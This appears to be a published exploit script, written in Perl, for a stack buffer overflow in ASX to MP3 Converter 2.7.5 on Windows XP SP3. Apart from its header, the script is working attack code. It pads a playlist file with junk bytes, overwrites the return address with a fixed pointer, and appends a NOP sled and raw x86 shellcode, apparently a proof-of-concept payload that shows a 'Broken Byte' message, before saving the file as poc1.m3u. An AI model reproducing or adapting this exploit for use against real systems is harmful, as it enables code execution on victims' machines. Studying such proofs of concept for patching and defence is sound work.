###########################################################################################
# Exploit Title: ASX to MP3 Converter 2.7.5 stack buffer overflow
# Date: 6 Oct 2014
# Exploit Author: Amir Reza Tavakolian
# Vendor Homepage: http://binarylife.blog.ir/
# Software Link: http://download.cnet.com/ASX-to-MP3-Converter/3000-2168_4-10385919.html
# Version: 2.7.5
# Tested on: windows xp sp 3
#
#
# Special thanks to Mr Michael Czumak (T_v3rn1x) for his tutorial in securitysift.com. 
# Thanks Mike. :)
##########################################################################################
 
 
 
 
 
#!/usr/bin/perl
 
my $junk = "\x41" x 35056;
my $eip = pack ('V', 0x73e848a7);
 
 
 
my $nop = "\x90" x 4;
 
my $shellcode = "\x90" x 25;
$shellcode = $shellcode . "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42" .
           "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03" .
           "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b" .
            "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e" .
           "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c" .
           "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74" .
            "\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe" .
           "\x49\x0b\x31\xc0\x51\x50\xff\xd7";
 
my $junk1 = "c" x 24806;
 
 
 
 
my $total = $junk.$eip.$nop.$shellcode.$junk1;
my $file = "poc1.m3u";
 
 
open (FILE, ">$file");
print FILE $total;
close (FILE);
print "Done.../";
